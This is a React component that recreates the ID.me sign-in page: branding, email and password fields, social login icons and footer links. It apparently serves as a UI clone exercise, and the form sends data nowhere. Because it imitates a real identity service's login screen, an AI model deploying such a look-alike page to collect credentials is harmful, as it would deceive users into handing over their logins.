import React from "react";
import id from "../assets/id.png";
import download from "../assets/download2.png";
import { Link } from "react-router-dom";
import { FaFacebookF } from "react-icons/fa";
import { FcGoogle } from "react-icons/fc";
import { FaApple } from "react-icons/fa";
import { FaLinkedinIn } from "react-icons/fa";

const Login = () => {
  return (
    <div className="flex flex-col items-center justify-center bg-gray-100 min-h-screen">
      <div className="flex space-x-2 shadow-md bg-gray-200 p-2 w-full h-28 rounded justify-center items-center mt-2">
        <img src={id} alt="User ID Icon" className="w-16" />
        <h1 className="text-lg font-bold">+</h1>
        <img src={download} alt="Download Icon" className="w-16" />
      </div>
  
      <div className="w-[500px] bg-white p-8 rounded-xl shadow-lg border border-gray-300">
        <h1 className="text-2xl font-semibold text-center mb-6">Sign in to ID.me</h1>

        <div className="bg-[#f2faff] border-t border-b py-4 px-6 text-center rounded mb-6">
          <h1 className="text-gray-700">New to ID.me?</h1>
          <h2 className="underline text-blue-500 cursor-pointer">Create an ID.me account</h2>
        </div>
        
        <form className="space-y-6 mt-4 w-full">
  {/* Email Input */}
  <div className="flex flex-col">
    <label htmlFor="email" className="mb-1 text-sm font-semibold text-gray-700 ml-8">
      Email
    </label>
    <input
      type="email"
      name="email"
      id="email"
      placeholder="Enter your email address"
      required
      className="border border-gray-400 px-4 py-2 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-700 w-[370px] h-[50px] ml-8"
    />
  </div>

  {/* Password Input */}
  <div className="flex flex-col">
    <label htmlFor="password" className=" ml-8 mb-1 text-sm font-semibold text-gray-700">
      Password
    </label>
    <input
      type="password"
      name="password"
      id="password"
      placeholder="Enter your password"
      required
      className="border border-gray-400 px-4 py-2 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-700 w-[370px] h-[50px] ml-8"
    />
  </div>

  {/* Submit Button */}
  <div className="flex justify-center mt-6">
    <button
      type="submit"
      className="bg-[#1E88E5] rounded-md text-white w-[370px] h-[45px] flex justify-center items-center text-base sm:text-xl font-semibold hover:bg-blue-700 transition duration-300"
    >
      Sign In
    </button>
  </div>

  {/* OR Divider */}
 

  {/* Forgot Password Link Centered */}
  <div className="text-center">
    <Link to="/forgot-password" className="text-[#1E88E5] font-semibold text-sm underline hover:text-blue-700">
      Forgot Password?
    </Link>
  </div>
  <div className="flex items-center my-4">
    <div className="flex-grow h-px bg-gray-300" />
    <span className="px-3 text-gray-500 text-sm font-medium">OR</span>
    <div className="flex-grow h-px bg-gray-300" />
  </div>
</form>
<div className="flex justify-center items-center gap-4 mt-4">
  <div className="border rounded-sm border-gray-400 w-10 h-10 px-2 py-3 hover:shadow-md transition">
    <FaFacebookF className="text-blue-600 text-xl" />
  </div>
  <div className="border rounded-sm border-gray-400 w-10 h-10 px-2 py-3 hover:shadow-md transition">
    <FcGoogle className="text-xl" />
  </div>
  <div className="border rounded-sm border-gray-400 w-10 h-10 px-2 py-3 hover:shadow-md transition">
    <FaApple className="text-xl" />
  </div>
  <div className="border rounded-sm border-gray-400 w-10 h-10 px-2 py-3 hover:shadow-md transition">
    <FaLinkedinIn className="text-[#0077b5] text-xl" />
  </div>
</div>
<div className="flex justify-center items-center gap-4 mt-4 border border-gray-400 h-12  rounded-md text-blue-600">
  View more options
</div>




      </div>
      <div className=" -m-1 flex flex-col items-center justify-center shadow-md bg-gray-200 p-4 w-full rounded  text-sm text-gray-800 space-y-2">
  {/* First Row: English */}
  <div className="underline text-blue-600 cursor-pointer">English</div>

  {/* Second Row: Links */}
  <div className="flex items-center justify-center flex-wrap space-x-4 cursor-pointer">
    <span>What is ID.me?</span>
    <span className="border-l border-black h-4"></span>
    <span>Terms of Service</span>
    <span className="border-l border-black h-4"></span>
    <span>Privacy Policy</span>
  </div>
</div>

    </div>
  );
};

export default Login;
